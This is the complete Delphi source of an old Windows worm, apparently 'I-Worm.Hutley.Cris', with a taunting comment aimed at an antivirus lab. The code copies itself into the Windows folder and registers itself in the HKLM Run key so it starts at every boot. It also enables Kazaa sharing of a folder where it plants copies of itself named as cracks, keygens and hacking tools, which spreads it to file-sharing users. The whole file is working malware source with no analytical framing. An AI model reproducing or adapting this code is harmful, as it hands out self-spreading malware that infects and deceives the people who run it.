   program porn;

   {$APPTYPE CONSOLE}

   {  I-Worm.Hutley.Cris
      Brasil! Rulez! }

   // Please KAV Lab. this is I-Worm.Hutley.Cris
   // it´s the original name! Understand?
   uses
    Windows, SysUtils, Registry;

   procedure ExecutaViaRegistro(nome, path: string);
   var evrg: TRegistry;
   begin
    evrg := TRegistry.Create;
    evrg.RootKey := HKEY_LOCAL_MACHINE;
    evrg.OpenKey('SOFTWARE\Microsoft\Windows\CurrentVersion\Run', FALSE);
    evrg.WriteString(nome, path);
    evrg.Destroy;
   end;

   procedure Kazaa;
   var reg: Tregistry;
    Cris: array[0..260] of Char;
   begin
    reg := TRegistry.Create;
    reg.RootKey := HKEY_CURRENT_USER;
    reg.OpenKey('Software\Kazaa\LocalContent', True);
    reg.WriteString('DisableSharing', '0');
    reg.writestring('dir0', '012345:' + 'C:\Windows\files');
    reg.writestring('dir1', '012345:' + 'C:\Windows\files');
    reg.writestring('dir2', '012345:' + 'C:\Windows\files');
    reg.writestring('dir3', '012345:' + 'C:\Windows\files');
    reg.writestring('dir4', '012345:' + 'C:\Windows\files');
    reg.writestring('dir5', '012345:' + 'C:\Windows\files');
    CreateDirectory('C:\windows\files', nil);
    GetModuleFileNameA(0, Cris, SizeOf(Cris));
    CopyFile(Cris, 'C:\Windows\files\hotmail_hacker.exe', True);
    CopyFile(Cris, 'C:\Windows\files\hotmail_cracker.exe', True);
    CopyFile(Cris, 'C:\Windows\files\hotmail_account_sniffer.exe', True);
    CopyFile(Cris, 'C:\Windows\files\aim_hack.exe', True);
    CopyFile(Cris, 'C:\Windows\files\msn_crack.exe', True);
    CopyFile(Cris, 'C:\Windows\files\icq_hack.exe', True);
    CopyFile(Cris, 'C:\Windows\files\WarDialer.exe', True);
    CopyFile(Cris, 'C:\Windows\files\Delphi 6 - Serial Gen.exe', True);
    CopyFile(Cris, 'C:\Windows\files\WinxpHack.exe', True);
    CopyFile(Cris, 'C:\Windows\files\Delphi 7 Crack.exe', True);
    CopyFile(Cris, 'C:\Windows\files\win2k_serial_gen.exe', True);
    CopyFile(Cris, 'C:\Windows\files\yahoo_hack.exe', True);
    CopyFile(Cris, 'C:\Windows\files\ftp_crack.exe', True);
    CopyFile(Cris, 'C:\Windows\files\XP_keygen.exe', True);
    CopyFile(Cris, 'C:\Windows\files\PS2_emulator_bleem.exe', True);
    CopyFile(Cris, 'C:\Windows\files\win2k_pass_decryptor.exe', True);
    CopyFile(Cris, 'C:\Windows\files\Win2k_reboot_exploit.exe', True);
    CopyFile(Cris, 'C:\Windows\files\IIS_ShellBind.exe', True);
    CopyFile(Cris, 'C:\Windows\files\WinZip_KeyGen.exe', True);
    CopyFile(Cris, 'C:\Windows\files\Counter Strike_CD_Keygen.exe', True);
    CopyFile(Cris, 'C:\Windows\files\Delphi 2005 Keygen.exe', True);
    CopyFile(Cris, 'C:\Windows\files\Delphi 9 Keygen.exe', True);
    CopyFile(Cris, 'C:\Windows\files\Half_life Cd keygen.exe', True);
    CopyFile(Cris, 'C:\Windows\files\Hotmail Hacker.exe', True);
    CopyFile(Cris, 'C:\Windows\files\ICQ_Hackingtools.exe', True);
    CopyFile(Cris, 'C:\Windows\files\invisible_IP.exe', True);
   end;

   var
    Cris: array[0..260] of Char;

   begin
    GetModuleFileNameA(0, Cris, SizeOf(Cris));
    if not (FileExists('C:\Windows\WinExec.exe')) then
    begin
     CopyFile(Cris, 'C:\Windows\WinExec.exe', True);
     ExecutaViaRegistro('WinExec', 'C:\Windows\WinExec.exe');
    end else
     ExecutaViaRegistro('WinExec', 'C:\Windows\WinExec.exe');
    Kazaa;
   end.


